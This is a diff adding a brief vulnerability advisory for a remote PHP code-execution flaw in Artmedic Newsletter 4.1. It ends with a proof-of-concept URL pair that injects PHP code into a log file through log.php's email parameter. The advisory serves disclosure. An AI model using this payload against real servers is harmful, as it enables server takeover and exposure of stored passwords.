@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/18047/info
+
+Artmedic Newsletter is prone to a remote PHP code-execution vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker can exploit this issue to create files containing arbitrary content that can include arbitrary malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible. Attackers may also remove arbitrary log files, assisting them in obscuring their actions.
+
+Version 4.1 of the software is vulnerable to this issue; other versions may also be affected.
+
+http://www.example.com/log.php?logfile=info.php&logtime=000060&email=<?%20require($cur);%20echo%20$password%20?> http://www.example.com/log.php?logfile=info.php&logtime=000000
